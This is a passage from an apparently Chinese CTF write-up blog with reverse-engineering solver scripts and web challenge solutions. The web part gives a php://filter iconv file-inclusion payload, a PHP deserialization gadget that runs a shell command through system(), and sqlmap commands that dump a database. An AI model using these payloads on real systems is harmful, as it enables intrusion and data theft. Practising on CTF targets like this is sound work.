v4);，就是我们要去花的函数，双击进入(loc_1209)函数，可以看到一片大红，在下面我们找到了他的花指令所在地点，永真跳转，加E8，（E8就相当于跳过了8个字节的数据，所以E8后面才是我们真正要执行的代码数据）\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.69alfdji2do0.webp)\n\n（1）我们在E8的位置单击，摁D，将其转换成数据，然后我们对着E8右击，选择nop，将其nop掉\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7h3oybqr9u80.webp)\n\n（2）我们回到最开始的位置endbr64上面函数开头的位置，从上往下直到选中retn处停止，我们摁c将其转换成代码，再摁p转换成函数，这个花就成功去除了，我们可以看到，左侧IDA也不会爆红了\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231009132250253.png)\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.212ogn4b84m8.webp)\n\n``` c\nunsigned __int64 __fastcall sub_1209(__int64 a1, unsigned int a2)\n{\n  int i; // [rsp+18h] [rbp-118h]\n  unsigned int j; // [rsp+1Ch] [rbp-114h]\n  __int64 v5[33]; // [rsp+20h] [rbp-110h] BYREF\n  unsigned __int64 v6; // [rsp+128h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  memset(v5, 0, 256);\n  for ( i = 0; i <= 255; ++i )\n    *(v5 + i) = ~(i ^ a2);\n  for ( j = 0; a2 > j; ++j )\n    *(j + a1) = *(v5 + *(j + a1));\n  return v6 - __readfsqword(0x28u);\n}\n```\n\n反编译出来的代码通过分析就建立一个盒子，然后根据之前取到的数据，进行定位取值\n\n``` python\nchars =[\n  0xD0, 0xD0, 0x85, 0x85, 0x80, 0x80, 0xC5, 0x8A, 0x93, 0x89, \n  0x92, 0x8F, 0x87, 0x88, 0x9F, 0x8F, 0xC5, 0x84, 0xD6, 0xD1, \n  0xD2, 0x82, 0xD3, 0xDE, 0x87]\n\na = bytearray(256)\na2=25\nfor i in range(255):\n    a[i]=(~(i^25))&255\nfor j in range(a2):\n    chars[j] = a[chars[j]]\n    print(chr(chars[j]),end='')\n\n```\n\n我们将最后输出的值进行md5加密后提交即可\n\n\n\n### AndroGenshin\n\nJADX直接分析，我们可以看到他的逻辑，简单分析一下\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.39rvk8nhq8o0.webp)\n\nretval 是对username进行rc4加密，username是rc4的密钥，base64_tabla是需要解密的数据，我们直接写脚本进行解密\n\n``` python\ndef rc4_decrypt(key, ciphertext):\n    key = bytearray(key.encode('utf-8'))\n    S = list(range(256))\n    j = 0\n    for i in range(256):\n        j = (j + S[i] + key[i % len(key)]) % 256\n        S[i], S[j] = S[j], S[i]\n    \n    plaintext = bytearray()\n    i = j = 0\n    for byte in ciphertext:\n        i = (i + 1) % 256\n        j = (j + S[i]) % 256\n        S[i], S[j] = S[j], S[i]\n        keystream = S[(S[i] + S[j]) % 256]\n        plaintext.append(byte ^ keystream)\n    \n    return bytes(plaintext)\n\n# 用相同的密钥解密数据\nkey = \"genshinimpact\"\nencrypted_data = [125, 239, 101, 151, 77, 163, 163, 110, 58, 230, 186, 206, 84, 84, 189, 193, 30, 63, 104, 178, 130, 211, 164, 94, 75, 16, 32, 33, 193, 160, 120, 47, 30, 127, 157, 66, 163, 181, 177, 47, 0, 236, 106, 107, 144, 231,250,16, 36, 34, 91, 9, 188, 81, 5, 241, 235, 3, 54, 150, 40, 119, 202, 150]  # 替换为实际的加密数据\ndecrypted_data = rc4_decrypt(key, bytes(encrypted_data))\n\n# 打印解密后的数据\nprint(decrypted_data.decode('utf-8'))\n```\n\n这样就得到了我们的base64码表，直接使用网站进行解密就行\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.786srgfovds0.webp)\n\n在程序上username输入genshinimpact，密码输入flag，就会弹出一个原神启动的页面\n\n第二种方法：使用frida hook 的方式进行获取值\n\n``` js\nfunction main() {\n    Java.perform(function (){\n        var rc4class = Java.use(\"com.genshin.impact.it_is_not_RC4\");\n        console.log(\"hanshushi:\",rc4class);\n        rc4class.rc4.implementation = function (a,b){\n            console.log(\"zheshi a :\",a);\n            console.log(\"zheshi b :\",b);\n            var result = this.rc4(a,b);\n            console.log(\"jieguoshi:\",result);\n            return result;\n        }\n    })\n}\nmain()\n```\n\n然后我们在手机用户名输入genshinimpart，密码随便，然后就可以获得码表了\n\n![image-20231104221705868](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231104221705868.png)\n\n\n\n\n\n\n\n\n\n### C？C++？（）\n\n记录一次手搓脚本，因为原本的数据中存在负数，所以编写代码的时候一直出错，然后到最后就发现总是这两位错误，像%或者//这样的数进行逆向就是会发生这样的事，需要自己手搓，但最后发现只需要**%256 **就可以课\n\n记录第一接触.net的题目，第一次使用dnspy进行.net文件的反编译\n\n首先使用DIE查看，发现是长这样的，因为第一次接触，所以一开始并不知道怎么办，默认打开ida进行查看，但你看了后会发现完全做不了，不能反编译啥的\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.313nazrf2zk0.webp)\n\n于是上网搜索，发现是.net类型的逆向题目，我们可以使用dnspy软件进行反编译\n\n我们打开dnspy，选中文件->打开文件，选择我们的文件，在这个目录就可以查看到我们的主函数，非常直观，随后就到我们审代码，写脚本的时候了\n\n**![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2h1t2uozbw80.webp)**\n\n因为是加减的数值变化，所以不需要在意顺序，我编写出代码后最可恶的是一直报错，因为原数值中有负数，我们最后需要%256一下\n\n``` python\narray = [\n        68, 75, 66, 72, 99, 19, 19, 78, 83, 74,\n        91, 86, 35, 39, 77, 85, 44, 89, 47, 92,\n        49, 88, 48, 91, 88, 102, 105, 51, 76, 115,\n        -124, 125, 79, 122, -103\n    ]\nprint(len(array))\nfor i in range(len(array)):\n    print(hex(array[i]),end=' ')\nprint('\\n')\nnum = 35\narray2 = [' '] * 35\narray3 = [0] * 35\ntext2 = \"NEWSTAR\"\ntext2=list(text2)\nfor i in range(num):\n    array[i]=array[i] - i\n    array[i]=array[i] + ord(' ')\n# print(array[i]%255,end=' ')\n\nfor k in range(7):\n    array[k]=array[k] - (k^(-ord(text2[k])%4))\n    array[k+7]=array[k+7] - (ord(text2[k])%5)\n    array[k + 14] = array[k + 14] - (2 * k)\n    array[k + 21] = array[k + 21] - (k ^ 2)\n    array[k + 28] = (array[k + 28] - (ord(text2[k]) // 5 + ord('\\n')))\n\nfor i in range(4):\n    array[i]+=4\narray[5]+=12\narray[6]+=12\n# array[30]+=0x100\n# array[34]+=0x100\n\nfor l in range(num):\n    print(chr((array[l]%256)),end='')\n\n# print('\\n')\n# for p in range(num):\n#     print(chr((array[p]%255)),end='')\n\n```\n\n#### 记录一下自己手搓的经过+dnspy动调\n\n因为flag不正确，所以我把老的flag复制，然后在dnspy中点击上方的启动按钮，输入我们原本错误的flag，让他进行加密，加密结束后我们比较他加密后的数值与我们已知的数值，查看哪几位有错误，在我的原代码中，原本是没有的，是一步步手搓修改的\n\n``` python\narray[5]+=12\narray[6]+=12\n# array[30]+=0x100\n# array[34]+=0x100\n\nprint(chr((array[l]%256)),end='')中的%256\n```\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fe1yvgdo6w0.webp)\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231009195239402.png)\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231009195316946.png)\n\n### AndroDbgMe\n\n一道很简单的安卓调试题目，但我此前从来没有解出过这种题目，所以这也是开拓了新视野了\n\n安卓调试可以使用模拟器或者手机，写的话不能太详细，推荐一个安卓学习平台\n\n[《安卓逆向这档事》一、模拟器环境搭建 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn](https://www.52pojie.cn/thread-1695141-1-1.html)\n\n其中的第五节就是讲解的如何进行反调试，我使用的软件事jeb，注册什么的都有步骤，但up给的就是完整的，所以可以直接用\n\n我们使用jeb打开文件后，在左侧的层级里选择mainactivity，然后在右侧右击选择解析，即可看见java反编译后的文件，我们在jadx打开后发现的是一串串乱码一样的东西，jeb的强势之处就在于，\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.71s3irmk30w0.png)\n\n然后我们在模拟器中打开那个程序\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1shi3av2lls0.webp)\n\n然后在shell窗口中打开shell，第一次可能会连接失败，我们只需要再连接一次就可以了，然后连接上模拟器后，我们给模拟器赋予su权限，以致于可以连接上程序\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.10nfmyae5ark.webp)\n\n随后在jeb中点击这个按钮，弹出的指视框也能知道，我们调试的程序时正确的，直接选择附上，然后我们在模拟器中点击click就可以获取flag了\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qgr2vzu5zs0.webp)\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5sjekino3y40.webp)\n\n\n\n\n\n### R4ndom\n\n我们分析源码，可以看到如下是主要的加密函数，我们现在需要提出我们的密文，以及知道伪随机数的种子\n\n``` c\nfor ( i = 0; i < strlen(s); ++i )\n  {\n    v3 = s[i];\n    v4 = rand();\n    s[i] = Table[(16 * ((unsigned __int8)(v3 + v4 % 255) >> 4) + 15) & (unsigned __int8)(v3 + v4 % 255)];\n  }\n```\n\n我们在右侧的函数中找到srand，然后按x查找哪里调用了他，我们可以看到随机数种子,这是个坑，不要太相信他的反编译的结果，我们看机器码，可以看到真实的随机数种子\n\n``` c\nunsigned __int64 b(void)\n{\n  unsigned __int64 v1; // [rsp+18h] [rbp-8h]\n\n  v1 = __readfsqword(0x28u);\n  srand(0x5377654Eu);\n  return __readfsqword(0x28u) ^ v1;\n}\n```\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.42d0t6dysw20.webp)\n\n\n\n这个题目一共有两个点：\n\n（1）：这个题目是elf文件，在linux和kali中，伪随机数是不一样的，所以我们需要在linux的环境中才能执行\n\n（2）ELF文件在执行前，会先执行两个函数，其中一个就是.init_array，他会在main函数执行前进行执行，我们发现这其中是有两个函数的\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1vc04muf6qyo.webp)\n\n函数a：\n\n``` C\nbool a(void)\n{\n  bool result; // al\n\n  result = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) != 0;\n  if ( result )\n    exit(0);\n  return result;\n}\n```\n\n函数b：\n\n``` c\nunsigned __int64 b(void)\n{\n  unsigned __int64 v1; // [rsp+18h] [rbp-8h]\n\n  v1 = __readfsqword(0x28u);\n  srand(0x5377654Eu);\n  return __readfsqword(0x28u) ^ v1;\n}\n```\n\n我们可以看到函数a就是反调试的：\n\n`result = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) != 0;`: 这行代码使用`ptrace`系统调用来检测当前进程是否正在被跟踪（调试）。如果`ptrace`返回的值不等于0（即返回非零值），则说明当前进程正在被跟踪，将`result`设置为`true`，否则设置为`false`。\n\n所以我们可以动调，把断点定在执行他函数a时即将跳转的地方，然后在右侧的代码块右击选择set ip，或者快捷键ctrl+n，但我这里有点小问题，就是我的nop和set ip是一个快捷键，所以我的ctrl+n后把数据nop掉了，离谱\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.42u21lez2so0.webp)\n\n执行到哪里之后，我们可以再在这个地方，下断点，我们就可以提出我们的加密后的数据了（shift+e）\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.68sh79tguhw0.webp)\n\n此时我们有了很多需要的内容，那么现在我们就可以写解题脚本了，学习一种新的代码思路，爆破\n\n我们现在已知了加密过程以及加密后的数据，那么我们可以通过爆破的形式来获得我们想要的值，**比如我们知道ascii码表的可显示字符是32-126，那么我们就可以用这些数据一个一个的进行相同的加密，然后和加密后的数据进行对比，如果相同就输出原本的数据，这样就可以了**\n\n![](file:///D:/CTF/REVERSE/可打印字符.png)\n\n``` c\n#include <stdio.h>\n#include <stdlib.h>\nunsigned char Table[] = { 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16 };\nint main(void)\n{\n    unsigned char enc[42] = {\n    0xEE, 0xE6, 0xD7, 0xB2, 0x8A, 0xAB, 0x13, 0x35, 0x02, 0x7B, 0xC9, 0xB9, 0x9C, 0xBA, 0xED, 0x2E,0xBD, 0x4F, 0xFA, 0xEE, 0xC8, 0xF8, 0xE4, 0x16, 0x82, 0x63, 0x3B, 0x98, 0xF4, 0x14, 0x30, 0x38,0x07, 0x36, 0x84, 0x3D, 0x0C, 0x36, 0x32, 0xEA, 0x55, 0xA6 };\n    int s,i,j;\n    srand(0x7261745377654E);\n    for (i = 0; i < 42; ++i)\n    {\n        int ran_num = rand();\n        for (j = 0; j < 256; ++j)\n        {\n\n            s = Table[(16 * ((unsigned char)(j + ran_num % 255) >> 4) + 15) & (unsigned char)(j + ran_num % 255)];\n            if (s == enc[i])\n            {\n                printf(\"%c\", j);\n                break;\n            }\n\n        }\n    }\n    return 0;\n}\n```\n\n### easy_enc\n\n和上一个题其实是一个思路，主要也是要爆破，因为我们分析代码的时候发现在最后一个函数中，他有一个*58的操作，byte类型就溢出了，我们无法获取正确的加密后的函数，所以就可以进行单字节爆破，循环对数据进行加密操作，如果等于密文就输出原来的值就可以了\n\n分析源码，一眼就是我们的加密后的数据，这些数据实际时连在一起的，但ida识别错误，我们可以通过对数据重新定义进行修改，或者直接动调去获取数据，因为他们是连在一起的\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4gue0ombvhq0.webp)\n\n然后就是上面的加密函数，这一段的意义其实就是调用我们的4个加密函数，对我们的字符串进行加密操作\n\n``` c\n  for ( j = 0; j < 4; ++j )\n    ((void (__fastcall *)(char *))v8[j])(Str);\n```\n\n分析第一个加密函数，判断数据的范围然后进行数据修改，第二个加密函数是加key的操作，key也告诉我们了，第三个是对字符进行~操作，上面也解释了他的操作，最后一个就是一个*58的操作，会造成溢出，所以我们不能简单的去逆向出算法，最后选择进行单字节爆破的方式进行操作\n\n\n\n对于脚本的知识了解，__uint8_t 其实就是unsigned char，~按位取反运算是单目运算，用来求一个位串信息按位的反，即哪些为0的位，结果是1，而哪些为1的位，结果是0。k *= 52;最后会溢出\n\n我试过使用int类型时使用vstudio进行动态，最后的值会很大，使用unsigned char的意义在于正好存在溢出\n\n``` c\n#include <stdio.h>\n#include <stdlib.h>\n#include<string.h>\nint main(void)\n{\n    unsigned char enc[] =\n    {\n      0xE8, 0x80, 0x84, 0x08, 0x18, 0x3C, 0x78, 0x68, 0x00, 0x70,\n      0x7C, 0x94, 0xC8, 0xE0, 0x10, 0xEC, 0xB4, 0xAC, 0x68, 0xA8,\n      0x0C, 0x1C, 0x90, 0xCC, 0x54, 0x3C, 0x14, 0xDC, 0x30\n    };\n    int i;\n    unsigned char k;\n    char Str[] = \"NewStarCTF\";\n    for (i = 0; i < 29; i++) {\n        for (unsigned char j = 32; j <= 126; j++) {\n            k = j;\n            if (k < 65 || k > 90)\n            {\n                if (k < 48 || k > 57)\n                {\n                    if (k >= 97 && k <=122)\n                        k = (k - 89) % 26 + 97;\n                }\n                else\n                {\n                    k = (k - 45) % 10 + 48;\n                }\n            }\n            else\n            {\n                k = (k - 52) % 26 + 65;\n            }\n            k += (int)Str[i % strlen(Str)];\n            k = ~k;\n            k *= 52;\n            if (k == enc[i])\n            {\n                if ((j >= 'A' && j <= 'Z') || (j >= 'a' && j <= 'z')) {\n                    printf(\"%c\", j);\n                    break;\n                }\n            }\n        }\n    }\n\n    return 0;\n}\n```\n\n\n\n## web\n\n### include 0。0\n\n[✔PHP文件包含漏洞全面总结 - Zeker62 - 博客园 (cnblogs.com)](https://www.cnblogs.com/Zeker62/p/15322771.html#phpfilter)\n\n文件包含漏洞，可以使用各种伪协议进行读取文件，也分为本地文件包含和远程文件包含，本地文件包含就是可以使用比如\n\n> file: //伪协议\n> data:// 伪协议\n> phar://伪协议\n> zip:// 伪协议\n\n``` php\n <?php\nhighlight_file(__FILE__);\n// FLAG in the flag.php\n$file = $_GET['file'];\nif(isset($file) && !preg_match('/base|rot/i',$file)){\n    @include($file);\n}else{\n    die(\"nope\");\n}\n?> \n```\n\n分析源码，我们看到他对比普通的文件上传就多了一个base和rot的过滤，那么就是防止我们使用Conversion Filters中的base64\n\nphp://filter/convert.base64-encode/resource=flag.php \n\nphp://filter/string.rot13/resource=flag.php \n\n[php://filter的各种过滤器_php://filter过滤器种类-CSDN博客](https://blog.csdn.net/qq_44657899/article/details/109300335)\n\n那么还有其他的很多过滤器，那么我们使用可以使用convert.iconv.*过滤器\n\n> convert.iconv.<input-encoding>.<output-encoding>  or  convert.iconv.<input-encoding>/<output-encoding>\n\n那么我们就使用他utf-8和utf-7进行编码\n\n> ?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php\n\n![image-20231020200147972](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231020200147972.png)\n\n\n\n### Unserialize？\n\n[反序列化 | Lazzaro (lazzzaro.github.io)](https://lazzzaro.github.io/2020/05/15/web-反序列化/)\n\n反序列化的题目\n\n我们分析源码,看到这里只使用了一个魔法函数，destruct（#某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发），那么只要我们可以看到一个对象evil，我们只是赋值后并没有调用它，那么就会触发，我们就需要写一个序列化后的数据，他反序列后就会执行并调用\n\n``` php\n<?php\nhighlight_file(__FILE__);\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd;\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n\n@unserialize($_POST['unser']);\n?>\n```\n\n我们直接把他放到php的编译器中，首先调用这个对象，然后往里面传入值，这样就实现了调用类，并且system中的cmd赋予了命令\n\n``` php\n<?php\nclass evil {\n    private $cmd = 'nl /th1s_1s_fffflllll4444aaaggggg';\n}\n\n$a= new evil();\necho urlencode(serialize($a));\n```\n\n这里有个细节是cmd是私有变量，他的反序列和正常的反序列会有一点不同，但我发现在火狐是不可以直接穿的，但在谷歌浏览器的hackbar是可以的\n\n[PHP——serialize()序列化类变量public、protected、private的区别_serialize变量名为protect_Ho1aAs的博客-CSDN博客](https://blog.csdn.net/Xxy605/article/details/117336343)\n\n### 游戏高手\n\n一道游戏题目，我们直接去调试器里，查找和分数有关的名词，比如score\n\n我们可以看到这个函数是就是管理如果分数达到100000就能看到flag\n\n![image-20231021132353950](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231021132353950.png)\n\n我们直接去调试器里控制台里，输入games，他就会自动弹出gamescore，并且告诉你现在的分数，那么我们直接输入即可\n\n![image-20231021132054978](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231021132054978.png)\n\n### ez_sql\n\nsqlmap一把梭，我们首先在首页能看到几个按键，每个按键点击后都是一个get的传参，id=xx，那么我直接抓包get传参的数据流，然后再sqlmap的主目录新建一个1.txt，存放这个数据流\n\n![image-20231021132942254](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231021132942254.png)\n\n首先：\n\n查询是否可以找到数据库\n\n``` \npython3 sqlmap.py -r 1.txt\n```\n\n查数据库\n\n``` \npython3 sqlmap.py -r 1.txt -dbs --batch\n```\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2z3o4kl5wik0.webp)\n\n查表\n\n``` \npython3 sqlmap.py -r 1.txt -D ctf -tables --batch\n```\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.12f1b96x3ti.webp)\n\n查字段\n\n``` \npython3 sqlmap.py -r 1.txt  -D ctf -T here_is_flag --columns --batch\n```\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7041926o0hs0.webp)\n\n查数据\n\n``` \npython3 sqlmap.py -r 1.txt  -D ctf -T here_is_flag -C flag --dump --batch\n```\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.70u11xfx8z80.webp)\n\n当请求延时的时候使用--delay 1\n\n``` \npython3 sqlmap.py -r 1.txt -dbs --batch --delay 1\n```\n\n\n\n[记录分析做过的两道无参数 RCE 题-CSDN博客](https://blog.csdn.net/weixin_73051164/article/details/133955827)\n\n[RCE篇之无参数rce - 学安全的小白 - 博客园 (cnblogs.com)](https://www.cnblogs.com/pursue-security/p/15406272.html)\n\n\n\n\n\n# week3\n\n## STL\n\n一道C++逆向的题目，记录一下C++逆向的思路\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6enz85e6lv40.webp)\n\n分为作用域和函数，比如std就是一个作用域，我们可以分两种进行分辨\n\n（1）对于一个语句，前面的全部都是作用域，只有最后是我们需要的函数\n\nstd::string::size(v13)\n\n这一句就是前面std::string::都是作用域，直接看后面的size就知道他的作用是v13的长度\n\n（2）除了这种情况就是中间不都是作用域，而是函数的值\n\nv8 = std::operator <<<std::char_traits<char>>(&std::cout, \"Wrong!!\");\n\n例如以上这段，std以及中间这段就是作用域，我们可以读最后或者是作用域之后的值就是我们需要的函数比如这个就是对应着C++中的cout语句\n\ncout >> 'xxx'   对应上述就是利用的<<进行对应输出\n\nstd::reverse<__gnu_cxx::__normal_iterator<char *,std::string>>(v4, v3);\n\n还有这段就是典型的，前面是作用域，后面就是函数，中间是作用域，对于后面要调用的数值的作用域，然后最后是引入的数值\n\n\n\n我们分析逻辑：可以看到一开始是让你输入flag的值，存到v13中，且v13的值必须为44个大小，后续调用了re函数，对输入的数值进行逆置，然后对于逆置的数进行前后异或，本值等于本值与下一个值进行异或，\n\n```python\nif ( std::string::length(v13) != 44 )\n    exit(0);\n   \nstd::reverse<__gnu_cxx::__normal_iterator<char*,std::string>>(v4, v3);\n\n  for ( i = 0; i < (std::string::size(v13) - 1); ++i )\n  {\n    v5 = *std::string::operator[](v13, i + 1);\n    v6 = std::string::operator[](v13, i);\n    *v6 ^= v5;\n```\n\n\n\nPE指纹\n\nMZ，PZ\n\n\n\n\n\n## EzDLL\n\n\n\n``` c\n#include <stdio.h>\n#include <string.h>\n\nvoid Rc4_Init(unsigned char* s, unsigned char* key, int keylen);\nvoid Rc4_Crypt(unsigned char* s, unsigned char* data, int datalen);\n\nint main() {\n    unsigned char key[] = \"WOWOWOWWOWOWOW\";\n    unsigned char s[256];\n    unsigned char enc[] = { 0xF4, 0x87, 0xD4, 0xFA, 0x61, 0xA6, 0x71, 0x12, 0x75, 0x09, 0xFE, 0xD8, 0xE4, 0x38, 0x97, 0x51, 0xA8, 0xDF, 0x85, 0x65, 0xC2, 0xB2, 0x15, 0xEF, 0x1F, 0xEC, 0x69, 0xDD, 0x6E, 0xE9, 0xCF, 0x07, 0xAE, 0xC8, 0x17, 0xF0, 0x65, 0x72, 0xE6, 0x73, 0xA4, 0x0C, 0x87, 0x64, 0x9E, 0x9E, 0x71, 0x8C, 0x7F, 0xD7, 0x75, 0x84 };\n\n    int keylen = strlen((char*)key);\n\n    Rc4_Init(s, key, keylen);\n    Rc4_Crypt(s, enc, sizeof(enc));\n\n    printf(\"Flag: \");\n    for (int i = 0; i < sizeof(enc); i++) {\n        printf(\"%c\", enc[i]);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n\nvoid Rc4_Init(unsigned char* s, unsigned char* key, int keylen) {\n    int i, j = 0;\n\n    for (i = 0; i < 256; i++) {\n        s[i] = i;\n    }\n\n    for (i = 0; i < 256; i++) {\n        j = (j + s[i] + key[i % keylen]) % 256;\n        char temp = s[i];\n        s[i] = s[j];\n        s[j] = temp;\n    }\n}\n\nvoid Rc4_Crypt(unsigned char* s, unsigned char* data, int datalen) {\n    int i, j = 0, k = 0;\n    unsigned char temp;\n\n    for (i = 0; i < datalen; i++) {\n        j = (j + 1) % 256;\n        k = (k + s[j]) % 256;\n        temp = s[j];\n        s[j] = s[k];\n        s[k] = temp;\n        data[i] ^= s[(s[j] + s[k]) % 256];\n    }\n}\n```\n\n"},{"title":"re做题记录","url":"/2023/09/23/re做题记录/","content":"\n\n\n# 花指令\n\n[花指令总结_Captain_RB的博客-CSDN博客](https://blog.csdn.net/Captain_RB/article/details/123858864)\n\n## [NSSRound#3 Team]jump_by_jump\n\n[[NSSRound#3 Team\\]jump_by_jump | NSSCTF](https://www.nssctf.cn/problem/2313)\n\n为什么记录这个题目时因为他有花指令，是最简单的花指令\n\n首先我们使用ida打开，我们可以看到他的主函数里调用了flag函数，但是不显示，我们切换视图发现是有花指令导致他无法编译\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.l5jcce610eo.webp)\n\n我们看到他的特征就想到了多字节指令，我们在41188C(call或者jmp等等跳转函数)处，摁D将其转换成数据，将E8 nop 掉\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qkaosh9hjk0.webp)\n\n同时我们发现有很多变成了黄色的代码，我们一路对这些黄色的代码摁c将其转换成代码，最后我们可以选中全部的代码，摁d转换成数据，摁c转换成代码，最后摁p再编译成函数，就去掉了这类最简单的花指令，在函数内我们就发现了flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3x3dpjarkq60.webp)\n\n\n\n## [HNCTF 2022 WEEK2]e@sy_flower\n\n第二个简单的去花题目\n\n找到主函数后发现有花的地方\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.44rklresz740.webp)\n\n我们在这里找到了花指令的地方，我们直接右击选择patching->change byte\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.50qing3en4o0.webp)\n\n我们把E9->90 ,把E9nop掉，然后在main上p一下编译函数就可以了\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4saybtma0gs0.webp)\n\n\n\n``` c\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)\n{\n  signed int v3; // kr00_4\n  int i; // edx\n  char v5; // cl\n  unsigned int j; // edx\n  int v7; // eax\n  char v8; // [esp+0h] [ebp-44h]\n  char v9; // [esp+0h] [ebp-44h]\n  char Arglist[48]; // [esp+10h] [ebp-34h] BYREF\n\n  sub_401020(\"please input flag\\n\", v8);\n  sub_401050(\"%s\", (char)Arglist);\n  v3 = strlen(Arglist);\n  for ( i = 0; i < v3 / 2; ++i )\n  {\n    v5 = Arglist[2 * i];\n    Arglist[2 * i] = Arglist[2 * i + 1];\n    Arglist[2 * i + 1] = v5;\n  }\n  for ( j = 